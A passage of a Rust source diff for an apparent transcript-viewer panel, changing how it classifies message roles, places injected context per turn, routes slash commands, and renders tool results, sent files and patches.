-const ANSWER_KEY_INTERVAL: Duration = Duration::from_millis(120);
 
 /// A `tool_use` block that spawned conversations of its own.
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -6290,7 +9415,11 @@ fn group_cards_by_phase(
     for mut card in cards {
         // An `Agent` call spawns the one agent its card already accounts for, so its
         // cards are never grouped and keep whatever their own card says.
-        let phase = if is_workflow_call { card.phase.take() } else { None };
+        let phase = if is_workflow_call {
+            card.phase.take()
+        } else {
+            None
+        };
         // Matched against every group rather than only the one last opened: a phase that
         // ran several agents at once has as many cards, and a later phase's card can sit
         // between two of them, which merging only neighbours would draw as the same phase
@@ -6446,20 +9575,6 @@ fn session_agent_rows(
     rows
 }
 
-/// Whether the conversation holds the `tool_result` answering `tool_use_id`.
-///
-/// Read down the whole conversation rather than along the path the model can still see.
-/// Compaction deliberately severs that chain, so a call answered before one would read as
-/// unanswered against the active path for the rest of the session — and the file that
-/// records a question being asked is never deleted, so a question answered before a
-/// compaction would go on being drawn, pinning open the section that answers it.
-fn call_is_answered(transcript: &crate::Transcript, tool_use_id: &str) -> bool {
-    transcript
-        .full_path()
-        .iter()
-        .any(|record| tool_result_ids(record).contains(&tool_use_id))
-}
-
 /// Whether an agent is still worth offering a way into its conversation.
 ///
 /// An agent that has returned is taken off every list it was on: what a row, a chip or a
@@ -6514,9 +9629,11 @@ fn agent_row_body(
                 .color(label_color)
                 .single_line(),
         )
-        .children(
-            note.map(|note| Label::new(note).size(LabelSize::XSmall).color(Color::Hidden)),
-        )
+        .children(note.map(|note| {
+            Label::new(note)
+                .size(LabelSize::XSmall)
+                .color(Color::Hidden)
+        }))
 }
 
 /// What a session list row says beside an agent's name, or `None` when it can say
@@ -6711,7 +9828,8 @@ struct BackgroundShell {
 /// Every background shell the conversation records, in the order they were started.
 ///
 /// Read down the whole conversation rather than the path the model can still see, for the
-/// reason [`call_is_answered`] gives: compaction severs that chain, and a shell started
+/// reason a question answered before compaction is still recorded: compaction severs that
+/// chain, and a shell started
 /// before one is still running after it — dropping it from the list would be the panel
 /// claiming a running command had stopped.
 fn background_shells<'records>(path: &[&'records TranscriptRecord]) -> Vec<BackgroundShell> {
@@ -6907,9 +10025,8 @@ fn announced_workflow_run_id(tool_use_id: &str, main_path: &[&TranscriptRecord])
 
 /// Why the input is disabled, or `None` when it is not.
 ///
-/// An agent's conversation is named before the missing pane is, because it is the reason
-/// the reader can act on: the way back is one chip away, whereas a session outside tmux
-/// is nothing they can do anything about from here.
+/// An agent's conversation is named before the missing channel is, because it is the
+/// reason the reader can act on: the way back is one chip away.
 fn input_note(
     can_send: bool,
     is_reading_an_agent: bool,
@@ -6927,8 +10044,86 @@ fn input_note(
     Some(SELECT_A_SESSION_TO_REPLY)
 }
 
+#[derive(Debug)]
+enum SlashSendDecision {
+    SendAsText,
+    OpenInTerminal,
+    NeedsArgument { example: String },
+}
+
+fn slash_command_name_and_argument(text: &str) -> Option<(&str, &str)> {
+    let trimmed = text.trim();
+    let rest = trimmed.strip_prefix('/')?;
+    if rest.is_empty() {
+        return None;
+    }
+    match rest.find(char::is_whitespace) {
+        Some(index) => Some((&rest[..index], rest[index..].trim())),
+        None => Some((rest, "")),
+    }
+}
+
+fn slash_send_decision(text: &str) -> SlashSendDecision {
+    let Some((name, argument)) = slash_command_name_and_argument(text) else {
+        return SlashSendDecision::SendAsText;
+    };
+    if CHANNEL_DIALOG_SLASH_COMMANDS.contains(&name) {
+        if name == "mcp" && !argument.is_empty() {
+            return SlashSendDecision::SendAsText;
+        }
+        return SlashSendDecision::OpenInTerminal;
+    }
+    if CHANNEL_ARGUMENT_SLASH_COMMANDS.contains(&name) && argument.is_empty() {
+        return SlashSendDecision::NeedsArgument {
+            example: format!("add an argument, e.g. /{name} opus"),
+        };
+    }
+    SlashSendDecision::SendAsText
+}
+
+fn slash_command_needs_terminal(name: &str) -> bool {
+    CHANNEL_DIALOG_SLASH_COMMANDS.contains(&name)
+}
+
+fn question_answer_title<'a>(header: &'a str, asked: &'a str) -> &'a str {
+    if header.is_empty() { asked } else { header }
+}
+
+fn compose_single_question_answer(header: &str, asked: &str, label: &str) -> String {
+    format!(
+        "Answer to \"{}\": {label}",
+        question_answer_title(header, asked)
+    )
+}
+
+fn compose_multi_question_answer(header: &str, labels: &[String]) -> String {
+    format!("Answers to \"{header}\": {}", labels.join("; "))
+}
+
+fn compose_type_something_prefix(header: &str, asked: &str) -> String {
+    format!("Answer to \"{}\": ", question_answer_title(header, asked))
+}
+
+fn pending_send_note(send: &PendingSend, now_ms: i64) -> SharedString {
+    if let Some(error) = send.error.as_ref() {
+        return error.clone();
+    }
+    match send.delivered_at_ms {
+        Some(delivered_at_ms) => {
+            let waiting_from = send.observed_at_ms.unwrap_or(delivered_at_ms);
+            if now_ms.saturating_sub(waiting_from) >= CHANNEL_WAIT_FOR_TRANSCRIPT_MS {
+                SharedString::from(CHANNEL_WAITING_NOTE)
+            } else {
+                SharedString::from(CHANNEL_DELIVERED_NOTE)
+            }
+        }
+        None => SharedString::from(SENDING_NOTE),
+    }
+}
+
 /// The line drawn above the input for an activity, or `None` for one that is not worth a
 /// line.
+#[cfg(test)]
 fn activity_label(activity: &Activity) -> Option<SharedString> {
     Some(match activity {
         // Withheld so that the line does not appear and disappear at the end of every
@@ -7052,12 +10247,14 @@ fn build_entries(
     // `tool_result` blocks name the call they answer by id, so the ids seen on the way
     // down the path are what lets a result be labelled with its tool's name.
     let mut tool_names: HashMap<String, SharedString> = HashMap::default();
+    let mut last_user_index: Option<usize> = None;
 
     for (path_index, record) in path.iter().enumerate() {
         let base_key = match record.uuid.as_ref() {
             Some(uuid) => SharedString::from(uuid.clone()),
             None => SharedString::from(format!("path-{path_index}")),
         };
+        let before = entries.len();
         append_record(
             record,
             base_key,
@@ -7067,21 +10264,63 @@ fn build_entries(
             &mut attachments,
             cache,
         );
+
+        if let Some(offset) = entries.get(before..).and_then(|added| {
+            added
+                .iter()
+                .position(|entry| entry_starts_a_turn(&entry.kind))
+        }) {
+            let user_index = before.saturating_add(offset);
+            if last_user_index.is_some() {
+                let shifted =
+                    flush_turn_attachments(&mut entries, &mut attachments, last_user_index);
+                last_user_index = Some(user_index.saturating_add(shifted));
+            } else {
+                last_user_index = Some(user_index);
+            }
+        }
     }
 
-    if !attachments.is_empty() {
-        // Attachments are the context Claude Code injected around the turns, not turns
-        // themselves, so they are folded into one section instead of interleaved.
-        entries.insert(
-            0,
-            Entry {
-                key: SharedString::from(ATTACHMENTS_ENTRY_KEY),
-                kind: EntryKind::Attachments { items: attachments },
-            },
-        );
-    }
-
+    flush_turn_attachments(&mut entries, &mut attachments, last_user_index);
     entries
+}
+
+fn entry_starts_a_turn(kind: &EntryKind) -> bool {
+    matches!(
+        kind,
+        EntryKind::Message {
+            role: MessageRole::User,
+            ..
+        } | EntryKind::SlashCommand { .. }
+            | EntryKind::Queued { .. }
+    )
+}
+
+fn flush_turn_attachments(
+    entries: &mut Vec<Entry>,
+    attachments: &mut Vec<AttachmentItem>,
+    last_user_index: Option<usize>,
+) -> usize {
+    if attachments.is_empty() {
+        return 0;
+    }
+    let items = std::mem::take(attachments);
+    let key = items
+        .first()
+        .map(|item| SharedString::from(format!("context-{}", item.key)))
+        .unwrap_or_else(|| SharedString::from(ATTACHMENTS_ENTRY_KEY));
+    let insert_at = last_user_index
+        .map(|index| index.saturating_add(1))
+        .unwrap_or(entries.len())
+        .min(entries.len());
+    entries.insert(
+        insert_at,
+        Entry {
+            key,
+            kind: EntryKind::Attachments { items },
+        },
+    );
+    1
 }
 
 fn append_record(
@@ -7093,16 +10332,35 @@ fn append_record(
     attachments: &mut Vec<AttachmentItem>,
     cache: &mut EntryCache,
 ) {
+    cache.remember_timestamp(Some(&base_key), record);
+
     // Context Claude Code injected into the turn rather than anything either side said:
     // a skill's instructions, an expanded command, the output of a hook. These carry the
     // user's own role and can run to tens of thousands of lines, so drawn as messages
-    // they bury the conversation they were injected into.
+    // they bury the conversation they were injected into. Records that carry an origin
+    // or promptSource are classified by those fields instead — a peer's isMeta message
+    // is still a message.
     if record
         .raw
         .get("isMeta")
         .and_then(Value::as_bool)
         .unwrap_or(false)
+        && origin_kind(record).is_none()
+        && prompt_source(record).is_none()
     {
+        return;
+    }
+
+    if origin_kind(record) == Some(TASK_NOTIFICATION_ORIGIN) {
+        if let Some(text) = task_notification_context_text(record) {
+            let cache_key = cache_key(record, &base_key);
+            attachments.push(cache.attachment(cache_key.as_ref(), || AttachmentItem {
+                key: base_key.clone(),
+                label: SharedString::from("system-notification"),
+                body: SharedString::from(text),
+                persisted: None,
+            }));
+        }
         return;
     }
 
@@ -7144,6 +10402,10 @@ fn append_record(
             return;
         }
 
+        if is_toolbar_attachment(record) {
+            return;
+        }
+
         let cache_key = cache_key(record, &base_key);
         attachments.push(cache.attachment(cache_key.as_ref(), || {
             attachment_item(record, base_key.clone(), home_directory)
@@ -7151,48 +10413,78 @@ fn append_record(
         return;
     }
 
-    match record.subtype.as_deref() {
-        Some(COMPACT_BOUNDARY_SUBTYPE) => {
-            let cache_key = cache_key(record, &base_key);
-            let kind = cache.kind(cache_key.as_ref(), || {
-                let metadata = record.compact_metadata.as_ref();
-                EntryKind::CompactBoundary {
-                    trigger: metadata
-                        .map(|metadata| SharedString::from(metadata.trigger.clone()))
-                        .unwrap_or_else(|| SharedString::from("unknown")),
-                    pre_tokens: metadata.and_then(|metadata| metadata.pre_tokens),
-                    post_tokens: metadata.and_then(|metadata| metadata.post_tokens),
-                }
-            });
-            entries.push(Entry {
-                key: base_key,
-                kind,
-            });
-            return;
-        }
-        Some(TURN_DURATION_SUBTYPE) => return,
-        Some(LOCAL_COMMAND_SUBTYPE) => {
-            let cache_key = cache_key(record, &base_key);
-            let kind = cache.kind(cache_key.as_ref(), || {
-                // These carry terminal output verbatim, escape sequences included.
-                match record.raw.get("content").and_then(Value::as_str) {
-                    Some(content) => EntryKind::LocalCommand {
-                        text: SharedString::from(strip_ansi_escapes(content)),
-                    },
-                    // A `content` that is not text is a shape this has no rule for, and
-                    // showing an empty command would drop the record.
-                    None => {
-                        unknown_kind(&record.record_type, record.subtype.as_deref(), &record.raw)
+    if record.record_type == SYSTEM_RECORD_TYPE {
+        match record.subtype.as_deref() {
+            Some(COMPACT_BOUNDARY_SUBTYPE) => {
+                let cache_key = cache_key(record, &base_key);
+                let kind = cache.kind(cache_key.as_ref(), || {
+                    let metadata = record.compact_metadata.as_ref();
+                    EntryKind::CompactBoundary {
+                        trigger: metadata
+                            .map(|metadata| SharedString::from(metadata.trigger.clone()))
+                            .unwrap_or_else(|| SharedString::from("unknown")),
+                        pre_tokens: metadata.and_then(|metadata| metadata.pre_tokens),
+                        post_tokens: metadata.and_then(|metadata| metadata.post_tokens),
                     }
-                }
-            });
-            entries.push(Entry {
-                key: base_key,
-                kind,
-            });
-            return;
+                });
+                entries.push(Entry {
+                    key: base_key,
+                    kind,
+                });
+                return;
+            }
+            Some(TURN_DURATION_SUBTYPE) => {
+                let cache_key = cache_key(record, &base_key);
+                let kind = cache.kind(cache_key.as_ref(), || turn_footer_kind(record));
+                entries.push(Entry {
+                    key: base_key,
+                    kind,
+                });
+                return;
+            }
+            // Bookkeeping about hooks having run, with nothing in it for the reader:
+            // drawn, it put an `Unrecognized` row after every turn. A hook that printed
+            // something for the reader writes it into this same record, and no other
+            // record holds it, so that one is drawn as the note it is.
+            Some(STOP_HOOK_SUMMARY_SUBTYPE)
+                if record
+                    .raw
+                    .get("content")
+                    .and_then(Value::as_str)
+                    .is_none_or(|content| content.trim().is_empty()) =>
+            {
+                return;
+            }
+            Some(LOCAL_COMMAND_SUBTYPE) => {
+                let cache_key = cache_key(record, &base_key);
+                let kind = cache.kind(cache_key.as_ref(), || {
+                    match record.raw.get("content").and_then(Value::as_str) {
+                        Some(content) => EntryKind::LocalCommand {
+                            text: SharedString::from(strip_ansi_escapes(content)),
+                        },
+                        None => unknown_kind(
+                            &record.record_type,
+                            record.subtype.as_deref(),
+                            &record.raw,
+                        ),
+                    }
+                });
+                entries.push(Entry {
+                    key: base_key,
+                    kind,
+                });
+                return;
+            }
+            _ => {
+                let cache_key = cache_key(record, &base_key);
+                let kind = cache.kind(cache_key.as_ref(), || system_note_kind(record));
+                entries.push(Entry {
+                    key: base_key,
+                    kind,
+                });
+                return;
+            }
         }
-        _ => {}
     }
 
     match record
@@ -7220,6 +10512,42 @@ fn append_record(
                 // first time looks up the name of its call here, and the `tool_use` block
                 // that named it may itself have come from the cache.
                 register_tool_name(block, tool_names);
+                if block.get("type").and_then(Value::as_str) == Some("tool_result") {
+                    let first_cache_key = cache_key(record, &key);
+                    if let Some(kind) = cache.get(first_cache_key.as_ref()) {
+                        entries.push(Entry {
+                            key: key.clone(),
+                            kind,
+                        });
+                        for part_index in 1.. {
+                            let part_key = SharedString::from(format!("{key}#part-{part_index}"));
+                            let part_cache_key = cache_key(record, &part_key);
+                            let Some(kind) = cache.get(part_cache_key.as_ref()) else {
+                                break;
+                            };
+                            entries.push(Entry {
+                                key: part_key,
+                                kind,
+                            });
+                        }
+                    } else {
+                        let kinds = tool_result_kinds(record, block, tool_names, home_directory);
+                        for (part_index, kind) in kinds.into_iter().enumerate() {
+                            let part_key = if part_index == 0 {
+                                key.clone()
+                            } else {
+                                SharedString::from(format!("{key}#part-{part_index}"))
+                            };
+                            let part_cache_key = cache_key(record, &part_key);
+                            let kind = cache.kind(part_cache_key.as_ref(), || kind);
+                            entries.push(Entry {
+                                key: part_key,
+                                kind,
+                            });
+                        }
+                    }
+                    continue;
+                }
                 let cache_key = cache_key(record, &key);
                 // The key carries the block's index within the record, so a block that
                 // is left out does not shift the keys of the ones after it.
@@ -7277,14 +10605,11 @@ fn register_tool_name(block: &Value, tool_names: &mut HashMap<String, SharedStri
 /// `None` for a user record whose text is nothing but injected context, which has no
 /// message in it to show; see [`user_visible_text`].
 fn message_kind(record: &TranscriptRecord, text: &str) -> Option<EntryKind> {
-    // The summary compaction leaves behind is recorded as a user message, so the record
-    // type alone would present a machine-written recap of the conversation as something
-    // the user had typed.
-    let role = if record.is_compact_summary {
-        MessageRole::CompactSummary
-    } else {
-        MessageRole::from_record_type(&record.record_type)
-    };
+    if origin_kind(record) == Some(TASK_NOTIFICATION_ORIGIN) {
+        return None;
+    }
+
+    let role = message_role(record);
 
     // Drawn as the command it was rather than as prose the user wrote: see
     // [`rewrite_slash_commands`].
@@ -7296,12 +10621,17 @@ fn message_kind(record: &TranscriptRecord, text: &str) -> Option<EntryKind> {
         }
     }
 
-    // Only what claims to be the user's own words is filtered: everything else in the
-    // transcript is shown as it was written.
-    let source = if role == MessageRole::User {
-        user_visible_text(text)?
-    } else {
-        text.to_string()
+    let source = match &role {
+        MessageRole::Peer { .. } => peer_message_body(text),
+        MessageRole::User => {
+            let visible = user_visible_text(text)?;
+            if origin_kind(record) == Some(CHANNEL_ORIGIN) {
+                channel_message_body(&visible)
+            } else {
+                visible
+            }
+        }
+        _ => text.to_string(),
     };
 
     Some(EntryKind::Message {
@@ -7312,8 +10642,249 @@ fn message_kind(record: &TranscriptRecord, text: &str) -> Option<EntryKind> {
     })
 }
 
+fn message_role(record: &TranscriptRecord) -> MessageRole {
+    if record.is_compact_summary {
+        return MessageRole::CompactSummary;
+    }
+
+    match origin_kind(record) {
+        Some(HUMAN_ORIGIN) | Some(CHANNEL_ORIGIN) => return MessageRole::User,
+        Some(PEER_ORIGIN) => {
+            return MessageRole::Peer {
+                from: peer_from(record),
+            };
+        }
+        Some(_) => {}
+        None => {}
+    }
+
+    if prompt_source(record) == Some(SYSTEM_PROMPT_SOURCE) {
+        return MessageRole::System;
+    }
+
+    if origin_kind(record).is_some() || prompt_source(record).is_some() {
+        // A promptSource other than system, with no origin.kind we name, is still
+        // classified from the fields rather than from `type`.
+        if prompt_source(record) == Some("typed") || prompt_source(record) == Some("queued") {
+            return MessageRole::User;
+        }
+    }
+
+    // Records written before the origin fields existed carry the hand-back in the text
+    // alone, and one of them bundles a task notification with it. Drawn from `type` they
+    // would be the reader's own words.
+    if record.record_type == USER_RECORD_TYPE
+        && let Some(text) = record_message_text(record)
+        && let Some(from) = peer_handback_from(text)
+    {
+        return MessageRole::Peer { from };
+    }
+
+    MessageRole::from_record_type(&record.record_type)
+}
+
+fn origin_kind(record: &TranscriptRecord) -> Option<&str> {
+    record
+        .raw
+        .get("origin")
+        .and_then(|origin| origin.get("kind"))
+        .and_then(Value::as_str)
+}
+
+fn origin_from_field(record: &TranscriptRecord) -> Option<&str> {
+    record
+        .raw
+        .get("origin")
+        .and_then(|origin| origin.get("from"))
+        .and_then(Value::as_str)
+        .map(str::trim)
+        .filter(|from| !from.is_empty())
+}
+
+fn prompt_source(record: &TranscriptRecord) -> Option<&str> {
+    record.raw.get("promptSource").and_then(Value::as_str)
+}
+
+fn peer_from(record: &TranscriptRecord) -> Option<SharedString> {
+    if let Some(from) = origin_from_field(record) {
+        return Some(SharedString::from(from.to_string()));
+    }
+    let text = record
+        .raw
+        .get("message")
+        .and_then(|message| message.get("content"))
+        .and_then(Value::as_str)?;
+    agent_message_from(text).map(SharedString::from)
+}
+
+fn agent_message_from(text: &str) -> Option<String> {
+    let start = text.find("<agent-message")?;
+    let tag_end_offset = text.get(start..)?.find('>')?;
+    let opening = text.get(start..start.saturating_add(tag_end_offset))?;
+    let marker = "from=\"";
+    let from_start = opening.find(marker)? + marker.len();
+    let rest = opening.get(from_start..)?;
+    let from_end = rest.find('"')?;
+    let from = rest.get(..from_end)?.trim();
+    (!from.is_empty()).then(|| from.to_string())
+}
+
+/// Inner text of the outermost `<channel>` wrapper, or `None` when the text is not
+/// wrapped. The last `</channel>` is the close so a message that quotes one is not cut
+/// short.
+fn channel_inner_text(text: &str) -> Option<&str> {
+    let open = format!("<{CHANNEL_WRAPPER}");
+    let start = text.find(&open)?;
+    let tag_end_offset = text.get(start..)?.find('>')?;
+    let inner_start = start.saturating_add(tag_end_offset).saturating_add(1);
+    let close = format!("</{CHANNEL_WRAPPER}>");
+    let inner_end = text.rfind(&close)?;
+    if inner_end < inner_start {
+        return None;
+    }
+    text.get(inner_start..inner_end)
+}
+
+fn channel_message_body(text: &str) -> String {
+    match channel_inner_text(text) {
+        Some(inner) => inner.trim().to_string(),
+        None => text.to_string(),
+    }
+}
+
+/// The same unwrapping for a line read from the queue log rather than from a record.
+///
+/// A record says it came over the channel; the queue log says nothing about where its
+/// lines came from, so the envelope is only taken off text that is nothing but an
+/// envelope. A message in which the reader merely quotes the tags is their own words and
+/// is left whole.
+fn queued_message_body(text: &str) -> String {
+    let trimmed = text.trim();
+    let is_envelope = trimmed
+        .strip_prefix(&format!("<{CHANNEL_WRAPPER}"))
+        .is_some_and(|rest| rest.starts_with(['>', ' ', '\t', '\r', '\n']))
+        && trimmed.ends_with(&format!("</{CHANNEL_WRAPPER}>"));
+    match is_envelope {
+        true => channel_message_body(trimmed),
+        false => text.to_string(),
+    }
+}
+
+/// The sender of a hand-back a record carries in its text alone, or `None` for a record
+/// that is not one.
+///
+/// Only the shape Claude Code writes counts: the lead line, or the wrapper itself,
+/// standing at the start of what is left once the injected blocks are cut. A message in
+/// which the reader merely quotes either of them is still the reader's own.
+fn peer_handback_from(text: &str) -> Option<Option<SharedString>> {
+    let visible = user_visible_text(text)?;
+    let body = visible.trim();
+    let body = body
+        .strip_prefix(PEER_MESSAGE_LEAD)
+        .map(str::trim_start)
+        .unwrap_or(body);
+    if !body.starts_with(&format!("<{AGENT_MESSAGE_WRAPPER}")) {
+        return None;
+    }
+    Some(agent_message_from(body).map(SharedString::from))
+}
+
+fn peer_message_body(text: &str) -> String {
+    let mut body = text.trim();
+    if let Some(rest) = body.strip_prefix(PEER_MESSAGE_LEAD) {
+        body = rest.trim();
+    }
+    if let Some(inner) = tag_contents(body, AGENT_MESSAGE_WRAPPER) {
+        return inner.trim().to_string();
+    }
+    body.to_string()
+}
+
+fn record_message_text(record: &TranscriptRecord) -> Option<&str> {
+    record
+        .raw
+        .get("message")
+        .and_then(|message| message.get("content"))
+        .and_then(Value::as_str)
+        .or_else(|| record.raw.get("content").and_then(Value::as_str))
+}
+
+fn task_notification_context_text(record: &TranscriptRecord) -> Option<String> {
+    let text = record_message_text(record)?;
+    let stripped = user_visible_text(text).unwrap_or_default();
+    let stripped = stripped.trim();
+    if stripped.is_empty() {
+        return None;
+    }
+    Some(stripped.to_string())
+}
+
+fn is_toolbar_attachment(record: &TranscriptRecord) -> bool {
+    matches!(
+        record
+            .raw
+            .get("attachment")
+            .and_then(|attachment| attachment.get("type"))
+            .and_then(Value::as_str),
+        Some(TOTAL_TOKENS_REMINDER_ATTACHMENT) | Some(AUTO_MODE_ATTACHMENT)
+    )
+}
+
+fn turn_footer_kind(record: &TranscriptRecord) -> EntryKind {
+    let number = |key: &str| {
+        record
+            .raw
+            .get(key)
+            .and_then(|value| {
+                value.as_u64().or_else(|| {
+                    // Claude Code writes these from JavaScript numbers, which JSON may
+                    // carry as `272000.0`. A negative one is not a count of anything.
+                    value
+                        .as_f64()
+                        .filter(|number| number.is_finite() && *number >= 0.0)
+                        .map(|number| number as u64)
+                })
+            })
+            .unwrap_or(0)
+    };
+    EntryKind::TurnFooter {
+        duration_ms: number("durationMs"),
+        message_count: number("messageCount"),
+        pending_background_agents: number("pendingBackgroundAgentCount"),
+    }
+}
+
+fn system_note_kind(record: &TranscriptRecord) -> EntryKind {
+    match record.raw.get("content").and_then(Value::as_str) {
+        Some(text) => EntryKind::SystemNote {
+            subtype: SharedString::from(record.subtype.clone().unwrap_or_default()),
+            text: SharedString::from(text.to_string()),
+            url: if record.subtype.as_deref() == Some(BRIDGE_STATUS_SUBTYPE) {
+                record
+                    .raw
+                    .get("url")
+                    .and_then(Value::as_str)
+                    .and_then(bridge_url)
+            } else {
+                None
+            },
+        },
+        None => unknown_kind(&record.record_type, record.subtype.as_deref(), &record.raw),
+    }
+}
+
 /// `None` only for a user text block that is nothing but injected context; see
 /// [`message_kind`].
+/// The `bridge_status` URL as a link, or `None` for a string that is not one.
+fn bridge_url(url: &str) -> Option<SharedString> {
+    let url = url.trim();
+    let is_the_bridge = url.starts_with(BRIDGE_URL_PREFIX)
+        && !url
+            .chars()
+            .any(|character| character.is_whitespace() || character.is_control());
+    is_the_bridge.then(|| SharedString::from(url.to_string()))
+}
+
 fn block_kind(
     record: &TranscriptRecord,
     block: &Value,
@@ -7349,51 +10920,25 @@ fn block_kind(
                     .to_string(),
             );
             let input = block.get("input").map(json_text).unwrap_or_default();
+            let diff = (name.as_ref() == EDIT_TOOL_NAME)
+                .then(|| block.get("input").and_then(edit_input_diff))
+                .flatten()
+                .map(SharedString::from);
             EntryKind::ToolUse {
                 name,
                 input: SharedString::from(input),
+                id: block
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .map(|id| SharedString::from(id.to_string())),
+                diff,
             }
         }
 
         Some("tool_result") => {
-            let label = block
-                .get("tool_use_id")
-                .and_then(Value::as_str)
-                .and_then(|id| tool_names.get(id).cloned())
-                .unwrap_or_else(|| SharedString::from("Tool result"));
-            // The top-level `toolUseResult` is the structured result; the content block
-            // beside it is a rendering of that result meant for the model's context. The
-            // structured one is preferred while it yields text, then the rendering, and
-            // only a result with neither falls back to raw JSON rather than being lost.
-            let structured_result = record
-                .raw
-                .get("toolUseResult")
-                .filter(|_| record_holds_one_tool_result(record));
-            let text = structured_result
-                .and_then(tool_use_result_text)
-                .or_else(|| {
-                    let rendered = block_content_text(block.get("content"));
-                    (!rendered.is_empty()).then_some(rendered)
-                })
-                .or_else(|| structured_result.map(json_text))
-                .unwrap_or_default();
-            let is_error = block
-                .get("is_error")
-                .and_then(Value::as_bool)
-                .unwrap_or(false);
-            let body = match structured_persisted_output(structured_result, &text, home_directory)
-                // The placeholder text is only a fallback: one persisted result in
-                // eighty-six carries no `persistedOutputPath` beside it.
-                .or_else(|| parse_persisted_output(&text))
-            {
-                Some(persisted) => ToolResultBody::Persisted(persisted),
-                None => ToolResultBody::Inline(SharedString::from(text)),
-            };
-            EntryKind::ToolResult {
-                label,
-                is_error,
-                body,
-            }
+            return tool_result_kinds(record, block, tool_names, home_directory)
+                .into_iter()
+                .next();
         }
 
         Some("image") => image_kind(block),
@@ -7431,6 +10976,249 @@ fn record_holds_one_tool_result(record: &TranscriptRecord) -> bool {
                 .count()
                 == 1
         })
+}
+
+/// The files a `SendUserFile` result delivered, or `None` for any other result.
+///
+/// Keyed off the `attachments` array rather than off the tool's name, because the name is
+/// what the caller typed and the array is what the delivery recorded.
+fn sent_files_kind(
+    result: &Value,
+    is_error: bool,
+    result_text: Option<SharedString>,
+) -> Option<EntryKind> {
+    let files: Vec<SentFile> = result
+        .get("attachments")?
+        .as_array()?
+        .iter()
+        .filter_map(sent_file)
+        .collect();
+    if files.is_empty() {
+        return None;
+    }
+
+    let caption = result
+        .get("caption")
+        .and_then(Value::as_str)
+        .map(str::trim)
+        .filter(|caption| !caption.is_empty())
+        .map(|caption| SharedString::from(caption.to_string()));
+
+    Some(EntryKind::SentFiles {
+        caption,
+        files,
+        is_error,
+        result_text: is_error.then_some(result_text).flatten(),
+    })
+}
+
+fn tool_result_kinds(
+    record: &TranscriptRecord,
+    block: &Value,
+    tool_names: &HashMap<String, SharedString>,
+    home_directory: Option<&Path>,
+) -> Vec<EntryKind> {
+    let label = block
+        .get("tool_use_id")
+        .and_then(Value::as_str)
+        .and_then(|id| tool_names.get(id).cloned())
+        .unwrap_or_else(|| SharedString::from("Tool result"));
+    let is_error = block
+        .get("is_error")
+        .and_then(Value::as_bool)
+        .unwrap_or(false);
+    let structured_result = record
+        .raw
+        .get("toolUseResult")
+        .filter(|_| record_holds_one_tool_result(record));
+    let result_text = structured_result
+        .and_then(tool_use_result_text)
+        .or_else(|| {
+            let rendered = block_content_text(block.get("content"));
+            (!rendered.is_empty()).then_some(rendered)
+        });
+    if let Some(kind) = structured_result.and_then(|result| {
+        sent_files_kind(
+            result,
+            is_error,
+            result_text.as_deref().map(SharedString::from),
+        )
+    }) {
+        return vec![kind];
+    }
+
+    let mut kinds = Vec::new();
+    if let Some(Value::Array(items)) = block.get("content") {
+        let mut text_parts: Vec<String> = Vec::new();
+        for item in items {
+            match item.get("type").and_then(Value::as_str) {
+                Some("image") => {
+                    flush_tool_result_text(
+                        &mut kinds,
+                        &mut text_parts,
+                        &label,
+                        is_error,
+                        structured_result,
+                        home_directory,
+                    );
+                    kinds.push(image_kind(item));
+                }
+                Some("text") => {
+                    if let Some(text) = item.get("text").and_then(Value::as_str) {
+                        text_parts.push(text.to_string());
+                    }
+                }
+                _ => {
+                    text_parts.push(json_text(&without_base64_payload(item)));
+                }
+            }
+        }
+        if kinds.is_empty() && text_parts.is_empty() {
+            // Fall through to structured / JSON below.
+        } else {
+            flush_tool_result_text(
+                &mut kinds,
+                &mut text_parts,
+                &label,
+                is_error,
+                structured_result,
+                home_directory,
+            );
+            if !kinds.is_empty() {
+                return kinds;
+            }
+        }
+    }
+
+    let mut text = result_text
+        .or_else(|| structured_result.map(json_text))
+        .unwrap_or_default();
+    if label.as_ref() == WRITE_TOOL_NAME {
+        let note = write_result_note(structured_result);
+        if text.is_empty() {
+            text = note;
+        } else {
+            text = format!("{note}\n\n{text}");
+        }
+    }
+    if let Some(diff) = structured_patch_text(structured_result) {
+        text = if text.is_empty() {
+            diff
+        } else {
+            format!("{diff}\n\n{text}")
+        };
+    }
+    let body = match structured_persisted_output(structured_result, &text, home_directory)
+        .or_else(|| parse_persisted_output(&text))
+    {
+        Some(persisted) => ToolResultBody::Persisted(persisted),
+        None => ToolResultBody::Inline(SharedString::from(text)),
+    };
+    vec![EntryKind::ToolResult {
+        label,
+        is_error,
+        body,
+    }]
+}
+
+fn flush_tool_result_text(
+    kinds: &mut Vec<EntryKind>,
+    text_parts: &mut Vec<String>,
+    label: &SharedString,
+    is_error: bool,
+    structured_result: Option<&Value>,
+    home_directory: Option<&Path>,
+) {
+    if text_parts.is_empty() {
+        return;
+    }
+    let text = text_parts.join("\n");
+    text_parts.clear();
+    let body = match structured_persisted_output(structured_result, &text, home_directory)
+        .or_else(|| parse_persisted_output(&text))
+    {
+        Some(persisted) => ToolResultBody::Persisted(persisted),
+        None => ToolResultBody::Inline(SharedString::from(text)),
+    };
+    kinds.push(EntryKind::ToolResult {
+        label: label.clone(),
+        is_error,
+        body,
+    });
+}
+
+fn write_result_note(result: Option<&Value>) -> String {
+    match result
+        .and_then(|result| result.get("originalFile"))
+        .and_then(Value::as_str)
+    {
+        Some(original) => format!("overwrote {} lines", original.lines().count()),
+        None => "new file".to_string(),
+    }
+}
+
+fn structured_patch_text(result: Option<&Value>) -> Option<String> {
+    let patches = result?.get("structuredPatch")?.as_array()?;
+    let mut lines = Vec::new();
+    for patch in patches {
+        let Some(hunk_lines) = patch.get("lines").and_then(Value::as_array) else {
+            continue;
+        };
+        let old_start = patch.get("oldStart").and_then(Value::as_u64).unwrap_or(0);
+        let new_start = patch.get("newStart").and_then(Value::as_u64).unwrap_or(0);
+        lines.push(format!("@@ -{old_start},+{new_start} @@"));
+        for line in hunk_lines {
+            if let Some(text) = line.as_str() {
+                lines.push(text.to_string());
+            }
+        }
+    }
+    (!lines.is_empty()).then_some(lines.join("\n"))
+}
+
+/// The format a sent image will be decoded as, or `None` for a file this panel cannot
+/// draw. The media type the delivery recorded is preferred; the extension answers for the
+/// deliveries that recorded none.
+fn sent_image_format(file: &SentFile) -> Option<ImageFormat> {
+    if let Some(format) = file
+        .media_type
+        .as_ref()
+        .and_then(|media_type| ImageFormat::from_mime_type(media_type))
+    {
+        return Some(format);
+    }
+
+    let extension = file.path.extension()?.to_str()?.to_ascii_lowercase();
